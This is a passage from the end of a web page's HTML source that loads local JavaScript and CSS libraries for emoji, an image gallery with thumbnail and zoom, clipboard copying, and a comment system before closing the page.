src=/js/twemoji.min.js defer></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css></div></body></html>